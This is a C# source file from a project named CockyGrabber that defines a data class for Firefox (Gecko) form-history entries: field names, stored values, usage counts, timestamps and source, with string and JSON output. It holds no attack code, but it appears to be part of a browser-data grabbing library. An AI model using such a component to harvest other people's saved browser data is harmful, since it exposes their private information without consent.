using CockyGrabber.Utility;
using System;

namespace CockyGrabber
{
    public static partial class Gecko
    {
        public class Form
        {
            public enum Header
            {
                id,
                fieldname,
                value,
                timesUsed,
                firstUsed,
                lastUsed,
                guid,
            }

            /// <summary>
            /// The form data's id.
            /// </summary>
            public int Id { get; set; }
            /// <summary>
            /// The form data's field name.
            /// </summary>
            public string Fieldname { get; set; }
            /// <summary>
            /// The form data's value.
            /// </summary>
            public string Value { get; set; }
            /// <summary>
            /// The number of times the form data has been used.
            /// </summary>
            public int TimesUsed { get; set; }
            /// <summary>
            /// The date and time the form data was first used.
            /// </summary>
            public DateTimeOffset FirstUsed { get; set; }
            /// <summary>
            /// The date and time the form data was last used.
            /// </summary>
            public DateTimeOffset LastUsed { get; set; }
            /// <summary>
            /// The form data's guid.
            /// </summary>
            public string Guid { get; set; }

            /// <summary>
            /// The source id of the form data.
            /// </summary>
            public long SourceId { get; set; }
            /// <summary>
            /// The source of the form data. (The place from where it origins)
            /// </summary>
            public string Source { get; set; }

            public override string ToString() => $"Fieldname = '{Fieldname}' | Value = '{Value}' | Source = '{Source}'";
            public string ToJson() => Tools.BrowserInformationToJson(this);
        }
    }
}